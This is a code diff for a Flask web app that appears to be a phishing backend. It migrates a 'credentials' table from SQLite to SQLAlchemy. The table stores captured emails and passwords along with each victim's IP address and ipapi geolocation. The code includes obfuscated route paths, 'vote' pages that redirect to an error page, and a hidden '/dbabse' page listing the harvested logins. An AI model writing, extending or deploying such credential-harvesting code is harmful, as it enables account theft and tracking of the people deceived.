@@ -1,41 +1,34 @@
 from flask import Flask, redirect, request, render_template
+from flask_sqlalchemy import SQLAlchemy
 import os
 from datetime import datetime
-from json import dumps, loads
-import sqlite3
 import ipapi
 
-##################### CONFIGURATION ##########################
-
-REDIRECT_URL = 'error'  ## site to redirect to
-REDIRECT_URL2 = 'error'  ## site to redirect to
-locate = "wwsuobyiyUnvL99f/"
-locate2 = "ww7wHFjPBSVisuob/"
-view = os.getenv('USER')
-
-
-
-###############################################################
-
-# Create a SQLite database file
-conn = sqlite3.connect('data.db')
-c = conn.cursor()
-
-# Create table if it doesn't exist
-c.execute('''CREATE TABLE IF NOT EXISTS credentials
-             (id INTEGER PRIMARY KEY, data TEXT, account_type TEXT, ip TEXT, city TEXT, region TEXT, country TEXT, time TEXT)''')
-conn.commit()
-conn.close()
-
 app = Flask(__name__)
-conn = sqlite3.connect('data.db')
-c = conn.cursor()
 
-# Create table if it doesn't exist
-c.execute('''CREATE TABLE IF NOT EXISTS credentials
-             (id INTEGER PRIMARY KEY, data TEXT, account_type TEXT, ip TEXT, city TEXT, region TEXT, country TEXT, time TEXT)''')
-conn.commit()
-conn.close()
+# Configuration
+app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'postgresql://username:password@hostname/databasename')
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+
+db = SQLAlchemy(app)
+
+# Define the credentials model
+class Credential(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    email = db.Column(db.String(120))
+    password = db.Column(db.String(120))
+    account_type = db.Column(db.String(50))
+    ip = db.Column(db.String(50))
+    city = db.Column(db.String(50))
+    region = db.Column(db.String(50))
+    country = db.Column(db.String(50))
+    time = db.Column(db.String(50))
+
+
+@app.route('/initdb')
+def init_db():
+    db.create_all()
+    return "Database initialized!"
 
 @app.errorhandler(404)
 def page_not_found(e):
@@ -183,32 +176,22 @@ def vote_page2():
 
     return redirect(request.referrer + "error")
 
-@app.route("/delete/<int:id>")
+
+@app.route('/delete/<int:id>')
 def delete(id):
-    # Construct the absolute path to the SQLite database file
-    db_path = os.path.join(app.root_path, 'data.db')
+    credential = Credential.query.get(id)
+    if credential:
+        db.session.delete(credential)
+        db.session.commit()
 
-    # Delete record from the SQLite database
-    conn = sqlite3.connect(db_path)
-    c = conn.cursor()
-    c.execute("DELETE FROM credentials WHERE id=?", (id,))
-    conn.commit()
-    conn.close()
-
-    # Redirect back to the credentials page
     return redirect(request.referrer)
 
 @app.route("/dbabse")
 def show_credentials():
-    # Fetch data from SQLite database
-    conn = sqlite3.connect('data.db')
-    c = conn.cursor()
-    c.execute("SELECT * FROM credentials")
-    data = c.fetchall()
-    conn.close()
-
-    return render_template('credentials.html', data=data)
+    credentials = Credential.query.all()
+    return render_template('credentials.html', data=credentials)
 
 if __name__ == "__main__":
     app.run(debug=True)
+
 
